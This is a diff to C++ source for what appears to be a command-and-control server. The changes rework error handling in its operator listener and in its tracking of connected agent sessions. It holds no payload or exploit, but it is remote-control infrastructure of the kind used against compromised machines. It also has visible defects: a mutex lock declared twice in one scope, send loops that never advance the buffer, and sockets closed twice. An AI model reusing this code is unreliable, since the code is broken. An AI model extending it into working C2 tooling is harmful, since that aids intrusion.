@@ -28,8 +28,14 @@ void common::socket_check(int soc_fd){ // socket failure error handling
         std::perror("[*]connection failed");
         std::cout << std::endl;
         close(soc_fd);
-        exit(EXIT_FAILURE);
     }
+}
+
+
+void common::send_failed(int client_fd){
+    std::perror("[!] Data couldn't be sent from c2 server.");
+    std::cout << "\n[!] connection error" << std::endl;
+    close(client_fd);
 }
 
 
@@ -58,27 +64,59 @@ void server::bind_failed(int server_fd){
 }
 
 
-void common::connection_failed(int connection_status){
-    if(connection_status == 0){
-        std::perror("[-]server disconnected connection");
-        std::cout << std::endl;
-        exit(EXIT_FAILURE);
-    }
-    else{
-        std::perror("[-]receive failed");
-        std::cout << std::endl;
-    }
+
+void server::operator_data_recvHandling(int received_bytes, int client_fd){
+    if(received_bytes == 0)
+        std::cout << "[*] operator disconnected normally" << std::endl;
+    else if(received_bytes < 0)
+        std::cout << "[!] operator connection error" << std::endl;
+    close(client_fd);
 }
+
+
 
 
 void server::get_active_agents(int client_fd){ // function to send number of sessions present and session ids to operator console
     std::unique_lock<std::mutex> lock(session_reg_mutex);
     uint32_t sessionCount = htonl(session_registry.size()); 
-    send(client_fd, &sessionCount, sizeof(sessionCount), 0); // sending session count
-    for(auto session : session_registry){
-        uint32_t session_id = htonl(session.first);
-        send(client_fd, &session_id, sizeof(session_id), 0); // sending session id
+    lock.unlock();
+    uint32_t total_bytesSent = 0;
+    uint32_t flag = 0;
+    while(total_bytesSent < sizeof(sessionCount)){
+        int bytes_sent = send(client_fd, &sessionCount, sizeof(sessionCount)-total_bytesSent, 0); // sending session count
+        if(bytes_sent == -1){
+            common::send_failed(client_fd);
+            std::cout << "[!] operator disconnected" << std::endl;
+            flag = 1;
+            break;
+        }
+        else
+            total_bytesSent = total_bytesSent + (size_t)bytes_sent;
     }
+    if(flag == 1){
+        close(client_fd);
+        return;
+    }
+    std::unique_lock<std::mutex>lock(session_reg_mutex);
+    for(auto session : session_registry){
+        flag = 0;
+        total_bytesSent = 0;
+        uint32_t session_id = htonl(session.first);
+        while(total_bytesSent < sizeof(session_id)){
+            int bytes_sent = send(client_fd, &session_id, sizeof(session_id)-total_bytesSent, 0); // sending session id
+            if(bytes_sent == -1){
+                common::send_failed(client_fd);
+                std::cout << "[!] operator disconnected" << std::endl;
+                flag = 1;
+                break;
+            }
+            else
+                total_bytesSent = total_bytesSent + (size_t)bytes_sent;
+        }
+        if(flag == 1)
+            break;
+    }
+    lock.unlock();
     close(client_fd);
 }
 
@@ -201,14 +239,17 @@ void server::detect_active_agents(int client_fd, int session_id){
     char temp[1024];
     while(true){
         int received = recv(client_fd, temp, sizeof(temp), 0);
-        if(received == 0){ // received becomes 0 when agent disconnects and client_fd becomes invalid
+        if(received <= 0){ // received becomes 0 when agent disconnects and client_fd becomes invalid
             close(client_fd);
             {
                 std::unique_lock<std::mutex> lock_session_reg(session_reg_mutex); // locks the below code and automatically performs lock_session.unlock() when goes out of function scope unless explicitly called. This lock makes sure when multiple agents don't access session_registry at the same time. only when one finishes the other can modify it. Without locking multiple modifications of the session_registry at the same time might result in program crash or segmentation faults. []
                 session_registry.erase(session_id); // since session_registry is a pointer so we use arrow operator
-                std::cout << "[-]agent id : " << session_id << " is disconnected" << std::endl;
-                break;
             }
+            if(received == 0)
+                std::cout << "[!]agent id : " << session_id << " disconnected normally" << std::endl;
+            else
+                std::cout << "[!]agent id : " << session_id << "connection error" << std::endl;
+            break;
         }
     }
     display_active_agents();
@@ -271,8 +312,9 @@ void server::operator_listener(){
             bytes_received = recv(client_fd, command_length_bytes+recv_byte_counter, command_len-recv_byte_counter, 0);
             if(bytes_received > 0){
                 recv_byte_counter += bytes_received;
-            }else if(bytes_received <= 0){
-                common::connection_failed(bytes_received);
+            }else{
+                operator_data_recvHandling(bytes_received, client_fd);
+                break;
             }
         }while(recv_byte_counter != command_len);
         // in uint8_t the raw bytes of the command length is present
@@ -283,8 +325,9 @@ void server::operator_listener(){
             bytes_received = recv(client_fd, command.data()+recv_byte_counter, command_length-recv_byte_counter, 0);
             if(bytes_received > 0){
                 recv_byte_counter += bytes_received;
-            }else if(bytes_received <= 0){
-                common::connection_failed(bytes_received);
+            }else{
+                operator_data_recvHandling(bytes_received, client_fd);
+                break;
             }
         }while(recv_byte_counter != command_length);
         command_dispatcher(command, client_fd);
